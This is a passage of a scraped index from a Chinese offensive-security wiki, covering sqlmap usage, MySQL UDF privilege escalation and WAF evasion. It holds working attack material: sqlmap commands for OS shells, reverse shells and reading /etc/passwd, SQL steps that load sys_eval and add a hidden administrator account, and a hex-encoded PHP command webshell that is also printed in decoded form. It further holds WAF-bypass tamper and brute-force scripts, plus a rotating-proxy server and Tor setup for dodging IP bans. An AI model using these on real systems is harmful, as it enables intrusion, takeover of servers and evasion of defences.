\"http://url/news?id=1\"--string\"STRING_ON_TRUE_PAGE\" #指定关键词 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --sql-shell #执行指定sql命令 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --file /etc/passwd python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --os-cmd=whoami #执行系统命令 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --os-shell #系统交互shell python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --os-pwn #反弹shell python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --reg-read #读取win系统注册表 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dbs-o \"sqlmap.log\" #保存进度 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dbs -o \"sqlmap.log\" --resume #恢复已保存进度sqlmap -g \"google语法\" --dump-all --batch #google搜索注入点自动 跑出所有字段攻击实例 python sqlmap/sqlmap.py -u \"http://url/news?id=1&Submit=Submit\" --cookie=\"PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406\" --string=\"Surname\" --dbms=mysql --users --password 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 23:04:05 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap/1.html":{"url":"Tools/Sqlmap/1.html","title":"Sqlmap udf提权过程","keywords":"","body":"sqlmap udf提权过程 0x01 UDF UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 0x02 windows下udf提权的条件 如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\\plugin文件夹下/ 如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\\windows\\system32目录，在windows server 2000下放置在c:\\winnt\\system32目录。 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。 拥有可以将udf.dll写入相应目录的权限。 0x03 提权方法 如果是mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\\plugin文件夹下才能创建自定义函数。该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建lib\\plugin文件夹，然后将udf.dll文件导出到该目录。 /* sqlmap\\udf\\mysql\\windows\\32目录下存放着lib_mysqludf_sys.dll_ sqlmap\\udf\\mysql\\windows\\64目录下为64位的lib_mysqludf_sys.dll_ */ 首先进入到 sqlmap\\extra\\cloak\\cloak 目录下，执行命令： cloak.py -d -i D:\\sqlmap\\udf\\mysql\\windows\\32\\lib_mysqludf_sys.dll_ 解密之后会在当前目录下生成dll文件。 将dll文件复制到mysql的/lib/plugin目录下，执行 create function sys_exec returns string soname \"lib_mysqludf_sys.dll\"; 攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。 执行命令： select sys_eval(‘whoami’); /* 函数介绍： sys_eval，执行任意命令，并将输出返回。 sys_exec，执行任意命令，并将退出码返回。 sys_get，获取一个环境变量。 sys_set，创建或修改一个环境变量。 */ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 01:45:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap/2.html":{"url":"Tools/Sqlmap/2.html","title":"Sqlmap udf提权原理","keywords":"","body":"slmap udf提权原理 0x01-udf是什么？ udf = 'user defined function'，即‘用户自定义函数’。是通过添加新函数，对MYSQL的功能进行扩充，性质就象使用本地MYSQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于‘mysql/lib/plugin’目录下，文件后缀为‘.dll’，常用c语言编写。 0x02-如何使用udf? 假设我的udf文件名为‘udf.dll’，存放在Mysql根目录(通过select @@basedir可知)的‘lib/plugin’目录下。在udf中，我定义了名为sys_eval的mysql函数，可以执行系统任意命令。如果我现在就打开mysql命令行，使用select sys_eval('dir');的话，系统会返回sys_eval()函数未定义。因为我们仅仅是把‘udf.dll’放到了某个文件夹里，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。 不要慌，看看实例用法： CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; 只有两个变量，一个是function_name（函数名），我们想引入的函数是sys_eval。还有一个变量是shared_library_name（共享包名称），即‘udf.dll’。 至此我们已经引入了sys_eval函数，下面就是使用了。 这个函数用于执行系统命令，用法如下： select sys_eval('cmd command'); 0x03-使用udf提权 现在我们已经知道了udf是什么，以及如何引入udf。下面我们要关注的就是提权了。其实到这里，提权已经结束了，因为对于sys_eval()函数，其中的指令是直接以管理员的权限运行的，所以这也就是最高权限了。 下面来整理一下思路： 1、将udf文件放到指定位置（Mysql>5.1放在Mysql根目录的lib\\plugin文件夹下） 2、从udf文件中引入自定义函数(user defined function) 3、执行自定义函数 先看第一步，拿到一个网站的webshell之后，在指定位置创建udf文件。如何创建？先别忘了，现在连源udf文件都没有。sqlmap中有现成的udf文件，分为32位和64位，一定要选择对版本，否则会显示：Can't open shared library 'udf.dll'。获取sqlmap的udf请看链接：MySQL 利用UDF执行命令 然后将获得的udf.dll文件转换成16进制，一种思路是在本地使用mysql函数hex： SELECT hex(load_file(0x433a5c5c55736572735c5c6b61316e34745c5c4465736b746f705c5c6c69625f6d7973716c7564665f7379732e646c6c)) into dumpfile 'C:\\\\Users\\\\ka1n4t\\\\Desktop\\\\gg.txt'; load_file中的十六进制是C:\\Users\\ka1n4t\\Desktop\\lib_mysqludf_sys.dll 此时gg.txt文件的内容就是udf文件的16进制形式。 接下来就是把本地的udf16进制形式通过我们已经获得的webshell传到目标主机上。 1.CREATE TABLE udftmp (c blob); //新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。 2. INSERT INTO udftmp values(unhex('udf文件的16进制格式')); //在udftmp中写入udf文件内容 3. SELECT c FROM udftmp INTO DUMPFILE 'H:\\\\PHPStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll'; //将udf文件内容传入新建的udf文件中，路径根据自己的@@basedir修改 //对于mysql小于5.1的，导出目录为C:\\Windows\\或C:\\Windows\\System32\\ 上面第三步，mysql5.1以上的版本是默认没有plugin目录的，网上有说可以使用ntfs数据流创建： select test into dumpfile 'H:\\\\PHPStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION'; 但是我本地测试一直没有成功。后来又在网上看了很多，都是用这种方法，看来是无解了。在t00ls上也有人说数据流从来没有成功过，所以说mysql5.1以上的提权能否成功还是个迷。 为了演示，在这里我是手工创建了个plugin目录(ps: 勿喷啦，我用的phpstudy环境，重新安装一个mysql的话有可能会冲突，所以就没搞，毕竟原理都一样)。 继续，到这儿如果没有报错的话就说明已经在目标主机上成功生成了udf文件。下面要导入udf函数： 1. DROP TABLE udftmp; //为了删除痕迹，把刚刚新建的udftmp表删掉 2. CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; //导入udf函数 导入成功的话就可以使用了： SELECT sys_eval('ipconfig'); 返回网卡信息 附几个常用的cmd指令，用于添加一个管理员用户： net user ka1n4t ka1n4t~!@ /add //添加新用户：ka1n4t，密码为ka1n4t~!@ net localgroup administrators ka1n4t /add //将ka1n4t添加至管理员分组 小节 1、提权原理： 利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库 2、数据库版本为 5.0 以下的： 如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导出到 C:\\Winnt\\udf.dll 下。 如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\\Windows\\udf.dll 下。 3、数据库版本为 5.1 以上的： 我们则需要将 dll 文件导出到 mysql 安装目录的 lib\\plugin\\ 下，才能创建自定义函数。注：如果没有 plugin 目录，我们可以进行手动创建！ 4、udf提权的两种姿势 1：通过大马的MySQL提权功能，成功导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd 命令，来执行提权操作。注：在此之前，我们应执行版本查看语句，来确认当前MySQL的版本信息！ net user secist secist.com /add net localgroup administrators secist /add 2：直接在目标服务器上传 udf.php 此类的提权脚本提权。 方法是一样的，先导出 dll 文件到正确位置。 再在自定义SQL语句执行框内，执行以下命令，来创建调用函数并进行提权！ 1. create function cmdshell returns string soname ‘udf.dll’; 创建 cmdshell 调用函数 2. select cmdshell(‘net user secist secist.com /add’); 添加用户 3. select cmdshell(‘net localgroup administrators secist /add’); 将用户加到管理组 4. drop function cmdshell; 删除函数 5. delete from mysql.func where name='cmdshell'; 删除函数 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 01:51:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap/3.html":{"url":"Tools/Sqlmap/3.html","title":"Sqlmap os-shell原理","keywords":"","body":"sqlmap os-shell原理 0x01 流程 i. 简单判断 从截图显示中，可以看到有以下几步 1、选择 web 应用语言 2、发现（提供）一个可写的绝对路径 3、顺序（不同方法）上传tmpujout.php、tmpbvwsp.php两个文件 ii. 流量分析 主要的http流量有 4 条，第 2 条根据@@version_compile_os首字母判断操作系统，第 4 条开始写入文件 1. id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x34,1024)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- MBKa&Submit=Submit 2. id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT (CASE WHEN (0x57=UPPER(MID(@@version_compile_os,1,1))) THEN 1 ELSE 0 END)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- EJbF&Submit=Submit 3. id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x31,451)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- LNMk&Submit=Submit 4. id=1' LIMIT 0,1 INTO OUTFILE '/var/www/html/hackable/uploads/tmpujout.php' LINES TERMINATED BY 0x3c3f7068702024633d245f524551554553545b22636d64225d3b407365745f74696d655f6c696d69742830293b4069676e6f72655f757365725f61626f72742831293b40696e695f73657428276d61785f657865637574696f6e5f74696d65272c30293b247a3d40696e695f676574282764697361626c655f66756e6374696f6e7327293b69662821656d70747928247a29297b247a3d707265675f7265706c61636528272f5b2c205d2b2f272c272c272c247a293b247a3d6578706c6f646528272c272c247a293b247a3d61727261795f6d617028277472696d272c247a293b7d656c73657b247a3d617272617928293b7d24633d24632e2220323e26315c6e223b66756e6374696f6e206628246e297b676c6f62616c20247a3b72657475726e2069735f63616c6c61626c6528246e29616e6421696e5f617272617928246e2c247a293b7d69662866282773797374656d2729297b6f625f737461727428293b73797374656d282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c736569662866282770726f635f6f70656e2729297b24793d70726f635f6f70656e2824632c617272617928617272617928706970652c72292c617272617928706970652c77292c617272617928706970652c7729292c2474293b24773d4e554c4c3b7768696c65282166656f662824745b315d29297b24772e3d66726561642824745b315d2c353132293b7d4070726f635f636c6f7365282479293b7d656c73656966286628277368656c6c5f657865632729297b24773d7368656c6c5f65786563282463293b7d656c736569662866282770617373746872752729297b6f625f737461727428293b7061737374687275282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c7365696628662827706f70656e2729297b24783d706f70656e2824632c72293b24773d4e554c4c3b69662869735f7265736f7572636528247829297b7768696c65282166656f6628247829297b24772e3d66726561642824782c353132293b7d7d4070636c6f7365282478293b7d656c7365696628662827657865632729297b24773d617272617928293b657865632824632c2477293b24773d6a6f696e28636872283130292c2477292e636872283130293b7d656c73657b24773d303b7d7072696e7420223c7072653e222e24772e223c2f7072653e223b3f3e-- -&Submit=Submit 之后 sqlmap 按路径尝试去访问文件tmpujqbu.php，通过 POST 上传后门文件tmpbzhga.php iii. 文件内容解析 可以看到tmpujqbu.php中的内容就是一个简单的文件上传，并将目标文件权限设置为 0755，注意这个文件生成利用的LINES TERMINATED BY，所以前面会带有之前 sql 执行的结果（这里就是admin admin） tmpujqbu.php admin admin sqlmap file uploaderto directory: \"; } ?> 而tmpbzhga.php可以看到就是一个标准的用于执行系统命令的后门脚本 // tmpbzhga.php &1\\n\"; function f($n) { global $z; return is_callable($n) and !in_array($n, $z); } if (f('system')) { ob_start(); system($c); $w = ob_get_contents(); ob_end_clean(); } elseif (f('proc_open')) { $y = proc_open($c, array( array( pipe, r ) , array( pipe, w ) , array( pipe, w ) ) , $t); $w = NULL; while (!feof($t[1])) { $w.= fread($t[1], 512); } @proc_close($y); } elseif (f('shell_exec')) { $w = shell_exec($c); } elseif (f('passthru')) { ob_start(); passthru($c); $w = ob_get_contents(); ob_end_clean(); } elseif (f('popen')) { $x = popen($c, r); $w = NULL; if (is_resource($x)) { while (!feof($x)) { $w.= fread($x, 512); } } @pclose($x); } elseif (f('exec')) { $w = array(); exec($c, $w); $w = join(chr(10) , $w) . chr(10); } else { $w = 0; } print \"\" . $w . \"\"; ?> 访问并执行ls命令 Q&A 1、原理简述 就是简单的上传一个 cmd shell 2、为什么要分两步呢? 不知道，明明可以直接一步上传 3、使用--os-shell需要的条件 FILE 权限 可写的结对路径 PHP GPC off 4、–os-shell 退出后会发生什么 会调用后门脚本删除上传文件后，进行自删除 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 01:56:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap+burpsuit辅助批量注入验证/1.html":{"url":"Tools/Sqlmap+burpsuit辅助批量注入验证/1.html","title":"sqlmap+burp辅助批量注入验证","keywords":"","body":"SleuthQL https://github.com/ianxtianxt/SleuthQL 0x01 SleuthQL介绍 SleuthQL是基于python3所开发的一款，用于批量爬行站点可能存在sql的地址。并且可以配合burp+sqlmap进行批量注入。 简单的说就是用burp采集网站路径以及页面，sqlmap跑全部可能存在uid注入的接口。 0x02 使用方法 参考参数： Options: -h, --help show this help message and exit -d DOMAINS, --domains=DOMAINS Comma separated list of domains to analyze. i.e.: google.com,mozilla.com,rhinosecuritylabs.com -f PROXY_XML, --xml=PROXY_XML Burp proxy history xml export to parse. Must be base64 encoded. -v, --verbose Show verbose errors that occur during parsing of the input XML. 1、首先先用burp爬行整个网站 2、接下来直接执行py python3 sleuthql.py -d www.0-sec.org -f xxx.com 这里会以txt的形式保存到本地 采用sqlmap进行批量测试 find . -name \"*.txt\" -exec sqlmap --batch -r {} --tables mysql \\; 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 02:02:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap tamper/3.html":{"url":"Tools/Sqlmap tamper/3.html","title":"sqlmap tamper速查梳理","keywords":"","body":"sqlmap tamper 速查梳理 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-19 13:17:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap tamper/1.html":{"url":"Tools/Sqlmap tamper/1.html","title":"bypass d盾tamper","keywords":"","body":"sqlmap bypass d盾 tamper 一 #!/usr/bin/env python from lib.core.enums import PRIORITY __priority__ = PRIORITY.LOW def dependencies(): pass def tamper(payload, **kwargs): \"\"\" BYPASS Ddun \"\"\" retVal = payload if payload: retVal = \"\" quote, doublequote, firstspace = False, False, False for i in xrange(len(payload)): if not firstspace: if payload[i].isspace(): firstspace = True retVal += \"/*DJSAWW%2B%26Lt%3B%2B*/\" continue elif payload[i] == '\\'': quote = not quote elif payload[i] == '\"': doublequote = not doublequote elif payload[i] == \" \" and not doublequote and not quote: retVal += \"/*DJSAWW%2B%26Lt%3B%2B*/\" continue retVal += payload[i] return retVal 二 需改修改url #@author:九世 #@time:2019/11/15 #@file:bypass.py from gevent import monkey;monkey.patch_all() from multiprocessing import Process from colorama import init,Fore import gevent import requests import time import asyncio import string init(wrap=True) class BypassDog(object): def __init__(self): self.data=string.digits+'!' #定义内容 self.payload='http://192.168.241.158/sql.php?id=0%20union%20select%201,2' self.ybs=[] self.djcs=[] self.xcs=[] self.calc=0 self.calc2=0 self.calc3=0 self.huan=' ' self.dr='' self.r='' def reqts(self,da): jg=self.payload.replace('%20','/*{}*/'.format(da)) try: rqt=requests.get(url=jg,headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'}) if not '网站防火墙' in rqt.text and not 'NULL' in rqt.text: print(Fore.GREEN+'[+] '+Fore.WHITE+' Bypass Dog url:{}'.format(jg)) print(jg,file=open('test.txt','a',encoding='utf-8')) exit() else: print(Fore.RED+'[-] '+Fore.WHITE+' Bypass Dog fuck url:{}'.format(jg)) except: pass def xc(self,rw): for g in rw: self.xcs.append(gevent.spawn(self.reqts,g)) gevent.joinall(self.xcs) self.xcs.clear() def djc(self): for u in self.ybs: if self.calc==100: p=Process(target=self.xc,args=(self.djcs,)) p.start() self.calc=0 self.djcs.clear() time.sleep(0.01) #0.01 CPU低于50% 0.005CPU低于70 0.003CPU低于95，根据内容数量来手动设置是否需要延时 self.djcs.append(u) self.calc+=1 if len(self.djcs)>0: p = Process(target=self.xc, args=(self.djcs,)) p.start() self.calc = 0 self.djcs.clear() async def yb(self): for g in range(1,len(self.data)+1): while True: if self.calc3>g: gd=self.dr+' pod={};self.ybs.append(pod);self.calc2+=1\\n{}' \\ 'if self.calc2==100:\\n{}' \\ ' self.djc()\\n{}self.calc2=0\\n{}self.ybs.clear()\\n' \\ 'if len(self.ybs)>0:\\n' \\ ' self.djc();self.calc2=0;self.ybs.clear()'.format(self.r.rstrip('+'),self.huan+' ',self.huan+' ',self.huan+' '+' ',self.huan+' '+' ') exec(gd) self.calc3=0 self.huan=' ' self.dr='' break else: self.dr+=\"for s{} in self.data:\\n{}\".format(self.calc3,self.huan) self.r+='s{}+'.format(self.calc3) self.calc3+=1 self.huan+=' ' if __name__ == '__main__': obj=BypassDog() loop=asyncio.get_event_loop() tk=loop.create_task(obj.yb()) loop.run_until_complete(tk) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-28 11:39:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap tamper/2.html":{"url":"Tools/Sqlmap tamper/2.html","title":"bypass 云锁tamper","keywords":"","body":"sqlmap bypass 云锁tamper 只支持用union查询来过的，其他的测试语句会被云锁报警，这里问下大佬sqlmap能不能指定union来测试。。 这个os-shell也可以写出shell脚本，但是还后续执行命令会被云锁报警 #!/usr/bin/env python \"\"\" Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) See the file 'LICENSE' for copying permission \"\"\" import re from lib.core.data import kb from lib.core.enums import PRIORITY from lib.core.common import singleTimeWarnMessage from lib.core.enums import DBMS __priority__ = PRIORITY.LOW def dependencies(): pass def tamper(payload, **kwargs): payload=payload.replace('ORDER','/*!00000order*/') payload=payload.replace('ALL SELECT','/*!00000all*/ /*!00000select') payload=payload.replace('CONCAT(',\"CONCAT/**/(\") payload=payload.replace(\"--\",\" */--\") payload=payload.replace(\"AND\",\"%26%26\") return payload 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-03 17:45:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap proxy/1.html":{"url":"Tools/Sqlmap proxy/1.html","title":"Tor-IP-Changer实现Sqlmap自动切换代理IP","keywords":"","body":"Tor-IP-Changer实现Sqlmap自动切换代理IP https://github.com/ianxtianxt/tor-ip-changer/ 使用工具： 小飞机、Proxifier、Tor Browser、Tor IP Changer、Sqlmap 操作步骤： 首先连上小飞机 配置Proxifier 配置代理服务器 配置代理规则 此时你已经是全局代理状态了 配置并打开Tor浏览器（不要关闭） 打开Tor IP Changer 点击 TOR server -> Start，等待软件自动配置完成 点击 Options -> Settings -> Interval(IP切换间隔时间，越快越不稳）-> Save 点击 IP changer -> Start，如下图所示即为成功 Sqlmap命令 sqlmap.py -u url --tor --tor-type=\"SOCKS5\" 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-21 11:33:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap proxy/2.html":{"url":"Tools/Sqlmap proxy/2.html","title":"Sqlmap rps脚本","keywords":"","body":"sqlmap rps脚本 PS:如果因为不可控因素脚本中的网站可能存在关站或者访问不了的情况，可以自行更改代理信息网站地址 ''' Rotating Proxy Server DKing@0-Sec ''' import sys,os,time,random,select import threading import logging import urllib2,socket import argparse import re timeout = 7 maxConnetions = 200 proxies = [] header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36'} def pickup_proxy(): return random.choice(proxies).split(':') def fetchproxy(url,reg,delay): logging.info(\"Fetching Proxies @ %s\",url) try: req = urllib2.Request(url,None,header) except: print(\"Failed to fetch proxies @ %s\",url) sys.exit response = urllib2.urlopen(req) html = response.read() p = re.compile(reg) proxy_list = p.findall(html) if len(proxy_list) > 0: for each_proxy in proxy_list[1:]: if len(each_proxy) == 4: if each_proxy[2] == 'HTTP' and float(each_proxy[3]) (\\d+\\.\\d+\\.\\d+\\.\\d+)\\n\\s+(\\d{2,5})\\n\\s+.{2,10}?\\n\\s+.{2,6}?\\n\\s+(.{4,8})?' reg_list_local=r'(\\d+\\.\\d+\\.\\d+\\.\\d+)\\n\\s+(\\d{2,5})\\n\\s+\\n\\s+.{30,50}?\\n\\s+\\n\\s+.{2,6}?\\n\\s+(.{4,8})?\\n\\s+\\n\\s+' reg_list_forg=r'(\\d+\\.\\d+\\.\\d+\\.\\d+)\\n\\s+(\\d{2,5})\\n\\s+\\n\\s+.{2,20}?\\n\\s+\\n\\s+.{2,6}?\\n\\s+(.{4,8})?\\n\\s+\\n\\s+' for i in range(page): fetchproxy(\"http://www.xicidaili.com/nn/\"+str(page),reg_list_local,delay) if foriegn == True: fetchproxy(\"http://www.xicidaili.com/wn/\"+str(page),reg_list_forg,delay) for eachline in proxies: fp.write(eachline+'\\n') fp.close() logging.info(\"Finished Fetching Proxies\") class Proxy: def __init__(self, addr): self.proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.proxy.bind(addr) self.proxy.listen(maxConnetions) self.inputs = {self.proxy:None} self.route = {} def serve_forever(self): while 1: readable, _, _ = select.select(list(self.inputs.keys()), [], []) for self.sock in readable: if self.sock == self.proxy: self.on_join() else: try: data = self.sock.recv(81920) except Exception, e: logging.error(str(e)) self.on_quit() continue if not data: self.on_quit() else: try: self.route[self.sock].send(data) except Exception, e: logging.error(str(e)) self.on_quit() continue def on_join(self): client, addr = self.proxy.accept() forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: subproxy_ip,subproxy_port=pickup_proxy() subproxy_port=int(subproxy_port) forward.settimeout(timeout) forward.connect((subproxy_ip,subproxy_port)) logging.info(\"%s:%d Forwarding success\",subproxy_ip,subproxy_port) except Exception, e: logging.error('%s:%d Error ... Switching to a New Proxy',subproxy_ip,subproxy_port) client.close() return self.inputs [client] = None self.inputs [forward] = None self.route[client] = forward self.route[forward] = client def on_quit(self): ls = [self.sock] if self.sock in self.route: ls.append(self.route[self.sock]) for s in ls: if s in self.inputs: del self.inputs[s] if s in self.route: del self.route[s] s.close() def main(): if len(sys.argv) == 1: print('\\n#python RPS.py -h for more options\\n') parser = argparse.ArgumentParser( description='\\t\\tRPS.py\\n\\tRotating Proxy Server\\nProvide a local HTTP Proxy Interface, forwarding your every request via different HTTP Proxies\\nCan be useful to \\'bypass\\' any Bans on IP from the website\\'s firewall', epilog='\\nDKing@0-Sec', prefix_chars='-/+', formatter_class=argparse.RawTextHelpFormatter ) parser.format_help parser.add_argument('--ip', type=str,default='127.0.0.1', help='Address to Listen on.\\t\\tDefault: 127.0.0.1') parser.add_argument('--port',type=int,default=8899, help='Port to Run on.\\t\\tDefault: 8899') parser.add_argument('--page',type=int, default=1, help='Pages to Crawl Proxy.\\t\\tDefault: 1') parser.add_argument('--delay', type=float, default=0.4, help='Max Delay of Proxies[second].\\tDefault: 0.4') parser.add_argument('--timeout', type=float, default=7, help='Timeout of each Request[second].\\tDefault: 7') parser.add_argument('--log', type=str,default='proxy.log', help='Logfile Name\\t\\t\\tDefault: proxy.log') parser.add_argument('--listname', type=str,default='proxylist.txt', help='Proxy List File Name[careful]\\tDefault: proxylist.txt') parser.add_argument('--uselist',action='store_true',default=False, help='Use Private Proxy list instead of fetch online.[sepcify with --listname]\\tDefault: OFF') parser.add_argument('--foriegn',action='store_true',default=False, help='Get Foriegn Proxy.[Very SLOW]\\tDefault: OFF') args = parser.parse_args() timeout=args.timeout logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s', datefmt='%m-%d %H:%M', filename=args.log, filemode='w') console = logging.StreamHandler() console.setLevel(logging.INFO) formatter = logging.Formatter('%(levelname)-5s %(message)s') console.setFormatter(formatter) logging.getLogger('').addHandler(console) if args.uselist == True: logging.info(\"Using Existing Proxy List\") for pline in open(args.listname,'r'): proxies.append(pline) elif os.path.exists(args.listname) and time.time() - os.path.getmtime(args.listname) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 11:23:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap proxy/3.html":{"url":"Tools/Sqlmap proxy/3.html","title":"ProxySqlMap version 0.2","keywords":"","body":"ProxySqlMap version 0.2 From Proxy to SqlMapApi https://github.com/ianxtianxt/ProxySqlMap 使用方法: 修改config.py: Ext_filter 为过滤的后缀名 sqlmap 为SQLmap地址 url 为需要拦截的url admin_token 为sqlmap的adminid 修改代理：127.0.0.1:8081 支持库: requests baseproxy(已经内置了，不需要再进行安装) https 支持: 访问:baseproxy.ca即可下载 输出: sqlsan.txt 为已创建的taskid与URL ok.txt为存在注入的URL以及taskid 参考链接 https://github.com/XiaoTouMingyo/ProxySqlMap 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 19:04:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/1.html":{"url":"提权EXP/1.html","title":"零组提权EXP自动更新脚本","keywords":"","body":"零组提权EXP更新脚本 下载地址 简介 零组基于Python开发的一款自动更新LINUX和Windows提权EXP脚本。 脚本支持Python2和3以及Windows和Linux，需要安装requests模块，使用命令:pip install requests 建议和BUG反馈，请加群交流群：793247367 脚本使用截图: windows Linux 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-19 11:46:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2004/1.html":{"url":"提权EXP/Linux/2004/1.html","title":"2004","keywords":"","body":" CVE-2005-0736　　[krad3](2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11) CVE-2005-1263　　[binfmt_elf.c](Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 14:38:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2006/1.html":{"url":"提权EXP/Linux/2006/1.html","title":"2006","keywords":"","body":" CVE-2006-3626　　[h00lyshit](2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16) CVE-2006-2451　　[raptor_prctl](2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 14:49:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2008/1.html":{"url":"提权EXP/Linux/2008/1.html","title":"2008","keywords":"","body":" CVE-2008-4210　　[ftrex](2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22) CVE-2008-0600　　[vmsplice2](2.6.23, 2.6.24) CVE-2008-0600　　[vmsplice1](2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 14:50:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/Linux/2009/1.html":{"url":"提权EXP/Linux/2009/1.html","title":"2009","keywords":"","body":" CVE-2009-3547　　